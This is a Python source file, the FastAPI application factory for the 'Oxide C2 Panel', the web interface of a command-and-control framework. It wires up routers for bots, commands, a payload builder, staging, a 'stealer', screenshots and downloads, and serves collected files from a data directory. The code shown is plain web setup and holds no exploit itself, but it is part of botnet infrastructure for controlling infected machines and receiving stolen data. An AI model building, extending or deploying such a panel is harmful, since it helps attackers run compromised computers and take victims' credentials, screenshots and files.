"""FastAPI application factory."""

import logging
from contextlib import asynccontextmanager
from pathlib import Path

from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles

from ..registry import Registry
from ..storage import close_db, init_db
from .events import EventBus, set_event_bus

logger = logging.getLogger(__name__)

WEB_DIR = Path(__file__).parent.parent.parent / "web"
DATA_DIR = Path(__file__).parent.parent.parent.parent / "data"


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Application lifespan - startup and shutdown."""
    # Startup
    logger.info("FastAPI starting up")
    await init_db()

    # Make event bus globally accessible for handler
    set_event_bus(app.state.event_bus)

    yield

    # Shutdown
    logger.info("FastAPI shutting down")
    await close_db()


def create_app(registry: Registry, event_bus: EventBus) -> FastAPI:
    """Create and configure the FastAPI application."""
    app = FastAPI(
        title="Oxide C2 Panel",
        description="Web interface for Oxide C2 framework",
        version="0.1.0",
        lifespan=lifespan,
    )

    # Store shared state
    app.state.registry = registry
    app.state.event_bus = event_bus

    # Import and include routers
    from .routers import auth, bots, builder, commands, downloads, screenshots, staging, stealer, ws

    app.include_router(auth.router)
    app.include_router(bots.router)
    app.include_router(commands.router)
    app.include_router(downloads.router)
    app.include_router(screenshots.router)
    app.include_router(builder.router)
    app.include_router(staging.router)
    app.include_router(stealer.router)
    app.include_router(ws.router)

    # Mount static files for web UI
    if WEB_DIR.exists():
        app.mount("/static", StaticFiles(directory=WEB_DIR / "static"), name="static")
        app.mount("/", StaticFiles(directory=WEB_DIR, html=True), name="web")

    # Mount data directory for file serving (downloads, screenshots)
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    app.mount("/data", StaticFiles(directory=DATA_DIR), name="data")

    return app
